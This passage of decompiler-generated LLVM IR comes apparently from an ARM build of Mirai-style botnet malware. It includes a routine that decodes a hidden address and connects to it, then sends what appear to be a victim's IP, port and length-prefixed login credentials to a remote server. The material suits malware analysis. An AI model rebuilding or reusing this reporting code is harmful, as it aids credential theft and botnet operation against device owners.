dec_label_pc_10c10.loopexit:                      ; preds = %dec_label_pc_10bfc
  store i1 %v3_10c00, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_10c10

dec_label_pc_10c10:                               ; preds = %dec_label_pc_10c10.loopexit, %dec_label_pc_10c0c
  %v0_10c24 = phi i32 [ %v0_10be4, %dec_label_pc_10c10.loopexit ], [ 0, %dec_label_pc_10c0c ]
  %v0_10c10 = load i32, i32* @r5, align 4
  %v1_10c10 = add i32 %v0_10c10, 4
  %v2_10c10 = inttoptr i32 %v1_10c10 to i32*
  %v3_10c10 = load i32, i32* %v2_10c10, align 4
  %v3_10c14 = udiv i32 %v3_10c10, 32
  store i32 %v3_10c14, i32* %r2.global-to-local, align 4
  %v1_10c18 = urem i32 %v3_10c10, 32
  store i32 %v1_10c18, i32* %r1.global-to-local, align 4
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  %v3_10c1c = mul nuw nsw i32 %v3_10c14, 4
  store i32 %v3_10c1c, i32* @ip, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_10c24 = inttoptr i32 %v0_10c10 to i32*
  store i32 %v0_10c24, i32* %v2_10c24, align 4
  %v0_10c28 = load i32, i32* %r3.global-to-local, align 4
  %v1_10c28 = load i32, i32* @r5, align 4
  %v2_10c28 = add i32 %v1_10c28, 24
  %v3_10c28 = inttoptr i32 %v2_10c28 to i32*
  store i32 %v0_10c28, i32* %v3_10c28, align 4
  %v0_fff0.pre = load i32, i32* @ip, align 4
  %v1_fff8.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_ffe8

dec_label_pc_10c30:                               ; preds = %dec_label_pc_10b60
  %v0_10c30 = load i32, i32* @r5, align 4
  %v1_10c30 = add i32 %v0_10c30, 4
  %v2_10c30 = inttoptr i32 %v1_10c30 to i32*
  %v3_10c30 = load i32, i32* %v2_10c30, align 4
  store i32 %v3_10c30, i32* %r0.global-to-local, align 4
  %v1_10c34 = call i32 @__GI___libc_close(i32 %v3_10c30)
  store i32 %v1_10c34, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  %v0_10c3c = load i32, i32* @r4, align 4
  %v1_10c3c = load i32, i32* @r5, align 4
  %v2_10c3c = add i32 %v1_10c3c, 12
  %v3_10c3c = inttoptr i32 %v2_10c3c to i32*
  store i32 %v0_10c3c, i32* %v3_10c3c, align 4
  %v0_10c40 = load i32, i32* %r3.global-to-local, align 4
  %v1_10c40 = load i32, i32* @r5, align 4
  %v2_10c40 = add i32 %v1_10c40, 4
  %v3_10c40 = inttoptr i32 %v2_10c40 to i32*
  store i32 %v0_10c40, i32* %v3_10c40, align 4
  %v0_10c44 = load i32, i32* @r4, align 4
  %v1_10c44 = trunc i32 %v0_10c44 to i8
  %v2_10c44 = load i32, i32* @r5, align 4
  %v3_10c44 = add i32 %v2_10c44, 284
  %v4_10c44 = inttoptr i32 %v3_10c44 to i8*
  store i8 %v1_10c44, i8* %v4_10c44, align 1
  br label %dec_label_pc_10110

dec_label_pc_10c4c:                               ; preds = %thread-pre-split103
  %v1_10c54 = add i32 %v0_10c54, 12
  %v2_10c54 = inttoptr i32 %v1_10c54 to i32*
  %v3_10c54 = load i32, i32* %v2_10c54, align 4
  store i32 %v3_10c54, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10008.backedge

dec_label_pc_10c5c:                               ; preds = %bb425
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_10c68 = call i32 @socket(i32 2, i32 1, i32 0)
  store i32 %v3_10c68, i32* %r0.global-to-local, align 4
  %v2_10c6c = icmp eq i32 %v3_10c68, -1
  store i1 %v2_10c6c, i1* %cpsr_c.global-to-local, align 1
  %v7_10c6c = icmp eq i32 %v3_10c68, -1
  store i1 %v7_10c6c, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_10c68, i32* @r4, align 4
  br i1 %v7_10c6c, label %dec_label_pc_10db8, label %dec_label_pc_10c78

dec_label_pc_10c78:                               ; preds = %dec_label_pc_10c5c
  store i32 4, i32* %r0.global-to-local, align 4
  %v1_10c7c = call i32 @table_unlock_val(i32 4)
  store i32 -1378207815, i32* %r2.global-to-local, align 4
  store i32 ptrtoint (i16** @global_var_26114.115 to i32), i32* %r3.global-to-local, align 4
  %v0_10c88 = load i32, i32* @r6, align 4
  store i32 %v0_10c88, i32* %r1.global-to-local, align 4
  store i32 -1378207815, i32* @global_var_26118.117, align 4
  store i32 4, i32* %r0.global-to-local, align 4
  %v2_10c94 = inttoptr i32 %v0_10c88 to i32*
  %v3_10c94 = call i32 @table_retrieve_val(i32 4, i32* %v2_10c94)
  store i32 %v2_10a7c, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r0.global-to-local, align 4
  %v1_10ca8 = call i32 @table_lock_val(i32 4)
  %v0_10cac = load i32, i32* @r4, align 4
  store i32 %v0_10cac, i32* %r0.global-to-local, align 4
  store i32 %v2_10a7c, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v3_10cb8 = call i32 @__libc_connect(i32 %v0_10cac, i32 %v2_10a7c, i32 16)
  store i32 %v3_10cb8, i32* %r0.global-to-local, align 4
  %v3_10cbc = icmp eq i32 %v3_10cb8, -1
  store i1 %v3_10cbc, i1* %cpsr_c.global-to-local, align 1
  %v8_10cbc = icmp eq i32 %v3_10cb8, -1
  store i1 %v8_10cbc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_10cbc, label %dec_label_pc_10cc4, label %dec_label_pc_10d14

dec_label_pc_10cc4:                               ; preds = %dec_label_pc_10c78
  %v0_10cc4 = load i32, i32* @r4, align 4
  store i32 %v0_10cc4, i32* %r0.global-to-local, align 4
  %v1_10cc8 = call i32 @__GI___libc_close(i32 %v0_10cc4)
  %v0_10ccc = load i32, i32* @r6, align 4
  store i32 %v0_10ccc, i32* %r0.global-to-local, align 4
  %v1_10cd0 = call i32 @__GI_exit(i32 %v0_10ccc)
  store i32 %v1_10cd0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10cd4

dec_label_pc_10cd4:                               ; preds = %dec_label_pc_100bc, %dec_label_pc_10cc4
  store i32 104, i32* %r3.global-to-local, align 4
  %v1_10cd8 = load i32, i32* @sb, align 4
  %v2_10cd8 = inttoptr i32 %v1_10cd8 to i32*
  store i32 104, i32* %v2_10cd8, align 4
  br label %dec_label_pc_100d4

dec_label_pc_10ce0:                               ; preds = %dec_label_pc_fe5c
  store i32 %v3_10ce0, i32* %r0.global-to-local, align 4
  %v3_10ce8 = udiv i32 %v3_10ce0, 32
  %v3_10cec = mul nuw nsw i32 %v3_10ce8, 4
  store i32 %v2_10cf0, i32* @lr, align 4
  %v2_10cf4 = add i32 %v3_10cec, %v2_10cf0
  store i32 %v2_10cf4, i32* %r3.global-to-local, align 4
  %v1_10cf8 = add i32 %v2_10cf4, -312
  %v2_10cf8 = inttoptr i32 %v1_10cf8 to i32*
  %v3_10cf8 = load i32, i32* %v2_10cf8, align 4
  %v1_10cfc = urem i32 %v3_10ce0, 32
  store i32 %v1_10cfc, i32* %r1.global-to-local, align 4
  %v7_10d00 = shl i32 1, %v1_10cfc
  %v8_10d00 = or i32 %v3_10cf8, %v7_10d00
  store i32 %v8_10d00, i32* %r2.global-to-local, align 4
  %v0_10d04 = load i32, i32* @r5, align 4
  %v3_10d04 = icmp uge i32 %v0_10d04, %v3_10ce0
  store i1 %v3_10d04, i1* %cpsr_c.global-to-local, align 1
  %v9_10d04 = icmp eq i32 %v0_10d04, %v3_10ce0
  store i1 %v9_10d04, i1* %cpsr_z.global-to-local, align 1
  %v5_10d08 = icmp slt i32 %v0_10d04, %v3_10ce0
  br i1 %v5_10d08, label %bb427, label %bb428

bb427:                                            ; preds = %dec_label_pc_10ce0
  store i32 %v3_10ce0, i32* @r5, align 4
  br label %bb428

bb428:                                            ; preds = %dec_label_pc_10ce0, %bb427
  store i32 %v8_10d00, i32* %v2_10cf8, align 4
  br label %bb378

dec_label_pc_10d14:                               ; preds = %dec_label_pc_10c78
  store i32 %v2_10754, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_10d24 = load i32, i32* @r4, align 4
  store i32 %v0_10d24, i32* %r0.global-to-local, align 4
  %v0_10d28 = load i32, i32* @r6, align 4
  %v6_10d28 = trunc i32 %v0_10d28 to i8
  store i8 %v6_10d28, i8* %stack_var_-56, align 1
  %v6_10d2c = call i32 @__libc_send(i32 %v0_10d24, i32 %v2_10754, i32 1, i32 16384)
  store i32 %v2_10740, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_10d40 = load i32, i32* @r4, align 4
  store i32 %v0_10d40, i32* %r0.global-to-local, align 4
  %v4_10d44 = call i32 @__libc_send(i32 %v0_10d40, i32 %v2_10740, i32 4, i32 16384)
  %v2_10d4c = ptrtoint i32* %stack_var_-42 to i32
  store i32 %v2_10d4c, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_10d58 = load i32, i32* @r4, align 4
  store i32 %v0_10d58, i32* %r0.global-to-local, align 4
  %v4_10d5c = call i32 @__libc_send(i32 %v0_10d58, i32 %v2_10d4c, i32 2, i32 16384)
  %v0_10d60 = load i32, i32* @r8, align 4
  %v1_10d60 = add i32 %v0_10d60, 12
  store i32 %v1_10d60, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_10d6c = load i32, i32* @r4, align 4
  store i32 %v0_10d6c, i32* %r0.global-to-local, align 4
  %v4_10d70 = call i32 @__libc_send(i32 %v0_10d6c, i32 %v1_10d60, i32 1, i32 16384)
  store i32 %v4_10d70, i32* %r0.global-to-local, align 4
  %v0_10d74 = load i32, i32* @r8, align 4
  %v1_10d74 = inttoptr i32 %v0_10d74 to i32*
  %v2_10d74 = load i32, i32* %v1_10d74, align 4
  store i32 %v2_10d74, i32* %r1.global-to-local, align 4
  %v1_10d78 = add i32 %v0_10d74, 12
  %v2_10d78 = inttoptr i32 %v1_10d78 to i8*
  %v3_10d78 = load i8, i8* %v2_10d78, align 1
  %v4_10d78 = zext i8 %v3_10d78 to i32
  store i32 %v4_10d78, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_10d80 = load i32, i32* @r4, align 4
  store i32 %v0_10d80, i32* %r0.global-to-local, align 4
  %v4_10d84 = call i32 @__libc_send(i32 %v0_10d80, i32 %v2_10d74, i32 %v4_10d78, i32 16384)
  %v0_10d88 = load i32, i32* @r8, align 4
  %v1_10d88 = add i32 %v0_10d88, 13
  store i32 %v1_10d88, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_10d94 = load i32, i32* @r4, align 4
  store i32 %v0_10d94, i32* %r0.global-to-local, align 4
  %v4_10d98 = call i32 @__libc_send(i32 %v0_10d94, i32 %v1_10d88, i32 1, i32 16384)
  %v0_10d9c = load i32, i32* @r4, align 4
  store i32 %v0_10d9c, i32* %r0.global-to-local, align 4
  %v0_10da0 = load i32, i32* @r8, align 4
  %v1_10da0 = add i32 %v0_10da0, 13
  %v2_10da0 = inttoptr i32 %v1_10da0 to i8*
  %v3_10da0 = load i8, i8* %v2_10da0, align 1
  %v4_10da0 = zext i8 %v3_10da0 to i32
  store i32 %v4_10da0, i32* %r2.global-to-local, align 4
  %v1_10da4 = add i32 %v0_10da0, 4
  %v2_10da4 = inttoptr i32 %v1_10da4 to i32*
  %v3_10da4 = load i32, i32* %v2_10da4, align 4
  store i32 %v3_10da4, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_10dac = call i32 @__libc_send(i32 %v0_10d9c, i32 %v3_10da4, i32 %v4_10da0, i32 16384)
  %v0_10db0 = load i32, i32* @r4, align 4
  store i32 %v0_10db0, i32* %r0.global-to-local, align 4
  %v1_10db4 = call i32 @__GI___libc_close(i32 %v0_10db0)
  store i32 %v1_10db4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10db8

dec_label_pc_10db8:                               ; preds = %dec_label_pc_10c5c, %dec_label_pc_10d14
  %v0_10db8 = load i32, i32* @r6, align 4
  store i32 %v0_10db8, i32* %r0.global-to-local, align 4
  %v1_10dbc = call i32 @__GI_exit(i32 %v0_10db8)
  store i32 %v1_10dbc, i32* %r0.global-to-local, align 4
  ret i32 %v1_10dbc

; uselistorder directives
  uselistorder i32 %v0_10d04, { 0, 2, 1 }
  uselistorder i32 %v1_10cfc, { 1, 0 }
  uselistorder i1 %v7_10c6c, { 1, 0 }
  uselistorder i32 %v3_10c68, { 1, 0, 2, 3 }
  uselistorder i32 %v3_10c54, { 1, 0 }
  uselistorder i32 %v3_10c10, { 1, 0 }
  uselistorder i1 %v3_10c00, { 1, 0 }
  uselistorder i32 %v0_10be4, { 0, 2, 4, 3, 1 }
  uselistorder i32 %v3_10bb0, { 2, 1, 0, 3 }
  uselistorder i32 %v3_10bac, { 1, 0 }
  uselistorder i32 %v0_10ba4, { 1, 0 }
  uselistorder i32 %v4_10b34, { 1, 0, 2 }
  uselistorder i32 %v3_10ae0, { 1, 0 }
  uselistorder i1 %v2_10aa8, { 1, 0 }
  uselistorder i32 %.432, { 1, 0 }
  uselistorder i1 %v7_10a90, { 1, 0 }
  uselistorder i32 %v0_10a8c, { 2, 1, 0, 3 }
  uselistorder i1 %v7_10a64, { 1, 0 }
  uselistorder i32 %v0_10a64, { 2, 1, 0, 3 }
  uselistorder i32 %v0_109e8, { 1, 0 }
  uselistorder i32 %v0_109cc.pr, { 1, 0 }
  uselistorder i32 %v0_10998, { 1, 2, 0 }
  uselistorder i32 %v0_1095c, { 1, 0 }
  uselistorder i32 %v1_10954, { 1, 0 }
  uselistorder i32 %v1_1094c, { 0, 2, 3, 4, 5, 1 }
  uselistorder i32 %v3_10948, { 1, 2, 3, 4, 0 }
  uselistorder i32 %v0_10948, { 0, 2, 1 }
  uselistorder i32 %v0_10928.pr, { 1, 0 }
  uselistorder i32 %v0_10908.pr, { 1, 0 }
  uselistorder i1 %v7_108e0, { 1, 0 }
  uselistorder i1 %v2_108d0, { 1, 0, 2 }
  uselistorder i1 %v2_108b4, { 1, 0, 2 }
  uselistorder i32 %v1_108d4, { 1, 2, 3, 0 }
  uselistorder i32 %v1_108a8, { 4, 2, 1, 3, 0 }
  uselistorder i32 %v2_108d8, { 0, 1, 4, 2, 3, 5 }
  uselistorder i32 %v0_1085c, { 1, 0 }
  uselistorder i32 %v0_10c54, { 1, 0, 2 }
  uselistorder i1 %v0_1084c, { 1, 0 }
  uselistorder i32 %v4_10840, { 1, 0, 2 }
  uselistorder i32 %v1_1080c, { 0, 1, 2, 3, 5, 4 }
  uselistorder i32 %v0_1080c, { 0, 2, 1 }
  uselistorder i32 %v0_10804, { 1, 0 }
  uselistorder i1 %v7_10800, { 1, 0 }
  uselistorder i1 %v7_107f8, { 1, 0 }
  uselistorder i1 %v8_107f0, { 1, 0 }
  uselistorder i1 %v7_107d4, { 1, 0 }
  uselistorder i1 %v7_107cc, { 1, 0 }
  uselistorder i1 %v8_107c4, { 1, 0 }
  uselistorder i32 %v1_107ac, { 1, 2, 3, 4, 5, 0, 6, 7, 8 }
  uselistorder i1 %v7_1077c, { 1, 0 }
  uselistorder i32 %v1_10724, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %v0_10724, { 0, 2, 1 }
  uselistorder i32 %v0_1071c, { 1, 0 }
  uselistorder i1 %v7_10718, { 1, 0 }
  uselistorder i1 %v7_10710, { 1, 0 }
  uselistorder i1 %v7_10708, { 1, 0 }
  uselistorder i1 %v8_10700, { 1, 0 }
  uselistorder i1 %v7_106e4, { 1, 0 }
  uselistorder i1 %v7_106dc, { 1, 0 }
  uselistorder i1 %v7_106d4, { 1, 0 }
  uselistorder i1 %v8_106cc, { 1, 0 }
  uselistorder i32 %v1_106b4, { 1, 2, 3, 4, 5, 6, 0, 7, 8, 9 }
  uselistorder i1 %v8_10650, { 1, 0 }
  uselistorder i8 %v3_10648, { 6, 7, 8, 9, 10, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_10640, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %v0_10640, { 0, 2, 1 }
  uselistorder i32 %v0_10638, { 1, 0 }
  uselistorder i1 %v7_10634, { 1, 0 }
  uselistorder i1 %v7_1062c, { 1, 0 }
  uselistorder i1 %v7_10624, { 1, 0 }
  uselistorder i1 %v7_10550, { 1, 0 }
  uselistorder i1 %v7_10548, { 1, 0 }
  uselistorder i1 %v7_10540, { 1, 0 }
  uselistorder i1 %v8_10538, { 1, 0 }
  uselistorder i32 %v1_10520, { 1, 2, 3, 4, 5, 6, 0, 7, 8, 9 }
  uselistorder i1 %v8_104bc, { 1, 0 }
  uselistorder i8 %v3_104b4, { 6, 7, 8, 9, 10, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_104ac, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %v0_104ac, { 0, 2, 1 }
  uselistorder i32 %v0_104a4, { 1, 0 }
  uselistorder i1 %v7_104a0, { 1, 0 }
  uselistorder i1 %v7_10498, { 1, 0 }
  uselistorder i1 %v7_10490, { 1, 0 }
  uselistorder i1 %v7_1047c, { 1, 0 }
  uselistorder i1 %v7_10474, { 1, 0 }
  uselistorder i1 %v7_1046c, { 1, 0 }
  uselistorder i1 %v8_10464, { 1, 0 }
  uselistorder i32 %v1_1044c, { 1, 2, 3, 4, 5, 6, 0, 7, 8, 9 }
  uselistorder i1 %v8_103e8, { 1, 0 }
  uselistorder i8 %v3_103e0, { 6, 7, 8, 9, 10, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_103d8, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %v0_103d8, { 0, 2, 1 }
  uselistorder i32 %v0_103d0, { 1, 0 }
  uselistorder i1 %v7_103cc, { 1, 0 }
  uselistorder i1 %v7_103c4, { 1, 0 }
  uselistorder i1 %v7_103bc, { 1, 0 }
  uselistorder i1 %v7_103a8, { 1, 0 }
  uselistorder i1 %v7_103a0, { 1, 0 }
  uselistorder i1 %v7_10398, { 1, 0 }
  uselistorder i1 %v8_10390, { 1, 0 }
  uselistorder i32 %v1_10378, { 1, 2, 3, 4, 5, 6, 0, 7, 8, 9 }
  uselistorder i1 %v8_10314, { 1, 0 }
  uselistorder i8 %v3_1030c, { 6, 7, 8, 9, 10, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_10304, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %v0_10304, { 0, 2, 1 }
  uselistorder i32 %v0_102fc, { 1, 0 }
  uselistorder i1 %v7_102f8, { 1, 0 }
  uselistorder i1 %v7_102f0, { 1, 0 }
  uselistorder i1 %v7_102e8, { 1, 0 }
  uselistorder i1 %v7_102d4, { 1, 0 }
  uselistorder i1 %v7_102cc, { 1, 0 }
  uselistorder i1 %v7_102c4, { 1, 0 }
  uselistorder i1 %v8_102bc, { 1, 0 }
  uselistorder i32 %v1_102a4, { 1, 2, 3, 4, 5, 6, 0, 7, 8, 9 }
  uselistorder i1 %v8_10240, { 1, 0 }
  uselistorder i8 %v3_10238, { 6, 7, 8, 9, 10, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_10230, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %v0_10230, { 0, 2, 1 }
  uselistorder i32 %v0_10228, { 1, 0 }
  uselistorder i1 %v7_10224, { 1, 0 }
  uselistorder i1 %v7_1021c, { 1, 0 }
  uselistorder i1 %v7_10214, { 1, 0 }
  uselistorder i1 %v7_10200, { 1, 0 }
  uselistorder i1 %v7_101f8, { 1, 0 }
  uselistorder i1 %v7_101f0, { 1, 0 }
  uselistorder i1 %v8_101e8, { 1, 0 }
  uselistorder i32 %v1_101d0, { 1, 2, 3, 4, 5, 6, 0, 7, 8, 9 }
  uselistorder i32 %v0_101bc, { 1, 2, 0 }
  uselistorder i32 %v2_101a8, { 1, 0 }
  uselistorder i32 %v0_101a8, { 2, 4, 0, 1, 3, 5 }
  uselistorder i32 %v3_101a4, { 2, 1, 4, 0, 5, 3 }
  uselistorder i32 %v1_1017c, { 2, 1, 0 }
  uselistorder i1 %v7_10158, { 1, 0 }
  uselistorder i32 %v4_10154, { 1, 0, 2 }
  uselistorder i32 %v1_10114, { 0, 2, 3, 4, 1 }
  uselistorder i1 %v1_100f0, { 1, 0 }
  uselistorder i32 %v1_100e4, { 2, 1, 0 }
  uselistorder i32 %v1_100e0, { 1, 0 }
  uselistorder i32 %v0_10084, { 2, 21, 4, 3, 20, 19, 5, 6, 23, 7, 8, 22, 9, 10, 24, 11, 12, 27, 13, 14, 25, 15, 16, 26, 17, 18, 28, 29, 1, 0 }
  uselistorder i32 %v1_10060, { 1, 2, 3, 0 }
  uselistorder i32 %v3_1005c, { 1, 0 }
  uselistorder i32 %v4_10040, { 0, 4, 1, 2, 3, 5, 6, 7 }
  uselistorder i32 %v2_1002c, { 1, 0, 2 }
  uselistorder i32 %v3_10028, { 1, 0, 2 }
  uselistorder i32 %v0_10af0, { 1, 0, 2 }
  uselistorder i32 %v3_fff4, { 1, 0 }
  uselistorder i32 %v1_ffd8, { 3, 2, 1, 0 }
  uselistorder i32 %v3_ffd4, { 1, 0 }
  uselistorder i32 %v3_ffcc, { 1, 2, 0 }
  uselistorder i1 %v7_ffb8, { 1, 0 }
  uselistorder i32 %v3_ffb4, { 3, 2, 1, 0, 4, 5 }
  uselistorder i32 %v0_ffa8, { 1, 0 }
  uselistorder i32 %v2_10a7c, { 1, 0, 2, 3 }
  uselistorder i32* %v2_1075c, { 1, 2, 3, 0 }
  uselistorder i32 %v2_10754, { 4, 5, 1, 0, 3, 6, 7, 2 }
  uselistorder i32 %v2_10740, { 1, 0, 3, 2, 9, 8, 5, 7, 6, 4 }
  uselistorder i32 %v2_1098c, { 1, 0 }
  uselistorder i32 %v1_ff58, { 0, 1, 3, 2 }
  uselistorder i32 %v0_ff58, { 0, 1, 3, 2 }
  uselistorder i32 %v1_ff24, { 2, 1, 0 }
  uselistorder i32 %v1_ff20, { 1, 0 }
  uselistorder i1 %v2_ff00, { 1, 0, 2 }
  uselistorder i32 %v0_fefc, { 1, 0, 2 }
  uselistorder i1 %v7_fec8, { 0, 3, 4, 1, 2 }
  uselistorder i1 %v2_fec8, { 1, 0, 2 }
  uselistorder i32 %v2_fec0, { 1, 2, 3, 4, 0 }
  uselistorder i32 %v2_feb4, { 1, 0, 2 }
  uselistorder i32 %v0_feb8, { 1, 0 }
  uselistorder i32 %v1_fe9c, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v1_fe90, { 0, 1, 3, 2 }
  uselistorder i32 %v0_fe90, { 0, 2, 1 }
  uselistorder i32 %v1_fe80, { 1, 0 }
  uselistorder i32 %v3_10ce0, { 4, 7, 5, 6, 1, 0, 9, 3, 2, 8 }
  uselistorder i32 %v2_10cf0, { 0, 7, 1, 5, 2, 4, 3, 6 }
  uselistorder i32 %v1_fdd0, { 1, 0 }
  uselistorder i32 %v1_fdb8, { 0, 2, 3, 1 }
  uselistorder i32 %v0_fdc4, { 0, 3, 2, 1 }
  uselistorder i32 %v0_fd74, { 2, 3, 4, 1, 0, 5, 7, 6 }
  uselistorder i32 %v5_fd68, { 2, 1, 0 }
  uselistorder i32 %v1_fd48, { 2, 0, 1, 3, 4 }
  uselistorder i1 %v2_fd24, { 1, 0 }
  uselistorder i1 %v9_fcf0, { 1, 0 }
  uselistorder i32 %v0_fca0, { 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_fc44, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v2_fbf4, { 1, 0 }
  uselistorder i32 %v5_fb8c, { 1, 0 }
  uselistorder i1 %v2_fad4, { 1, 0 }
  uselistorder i1 %v3_fab8, { 1, 0, 2 }
  uselistorder i1 %v2_faa4, { 1, 0 }
  uselistorder i1 %v2_fa80, { 1, 0 }
  uselistorder i32 %v1_fa30, { 14, 13, 12, 11, 15, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_fa1c, { 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 20, 21, 22, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 6, 7, 8, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_fa18, { 4, 5, 6, 7, 0, 8, 1, 2, 3, 9 }
  uselistorder i32 %v0_fa00, { 1, 0 }
  uselistorder i32 %v0_f9d8, { 1, 0 }
  uselistorder i32 %stack_var_-1880.0, { 0, 1, 2, 3, 4, 5, 7, 9, 12, 11, 6, 8, 10, 14, 13 }
  uselistorder i16 %v5_f710.le, { 0, 2, 1 }
  uselistorder i32 %v0_f6f4, { 3, 2, 0, 1 }
  uselistorder i1 %v7_f694, { 1, 0 }
  uselistorder i32 %v3_f68c, { 3, 2, 1, 0, 4, 5 }
  uselistorder i32 %v0_f678, { 1, 0 }
  uselistorder i32 %v0_f648, { 1, 0 }
  uselistorder i32 %storemerge308, { 1, 0 }
  uselistorder i32 %v0_f5bc, { 1, 2, 3, 0, 4 }
  uselistorder i16* %stack_var_-52, { 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 1, 0, 2 }
  uselistorder i32* %stack_var_-96, { 2, 0, 1, 3 }
  uselistorder i32* %stack_var_-68, { 1, 0 }
  uselistorder i32* %stack_var_-224, { 1, 0 }
  uselistorder i32* %stack_var_-352, { 1, 0 }
  uselistorder i8* %stack_var_-56, { 8, 7, 6, 5, 4, 3, 2, 0, 1 }
  uselistorder i32* %stack_var_-60, { 6, 7, 8, 0, 9, 1, 10, 4, 11, 2, 12, 3, 13, 5, 14 }
  uselistorder i32* %stack_var_-42, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 56, 57, 58, 59, 60, 61, 62, 68, 69, 63, 70, 71, 72, 73, 74, 76, 75, 77, 78, 79, 80, 17, 81, 150, 64, 65, 18, 19, 20, 151, 152, 153, 154, 155, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 66, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 105, 106, 108, 107, 104, 110, 109, 67, 111, 112, 156, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 157, 129, 130, 131, 132, 134, 133, 136, 135, 149, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148 }
  uselistorder i32* %r2.global-to-local, { 35, 36, 37, 38, 39, 40, 41, 50, 42, 43, 44, 51, 52, 53, 54, 9, 131, 45, 46, 10, 11, 0, 1, 2, 3, 4, 5, 6, 7, 8, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 47, 48, 132, 133, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 129, 130, 67, 68, 70, 69, 66, 71, 72, 49, 73, 134, 135, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 92, 91, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128 }
  uselistorder i32* %r1.global-to-local, { 36, 37, 38, 39, 40, 41, 42, 52, 43, 44, 45, 46, 53, 54, 55, 5, 114, 115, 47, 48, 6, 7, 51, 0, 1, 2, 3, 4, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 116, 117, 49, 50, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 113, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112 }
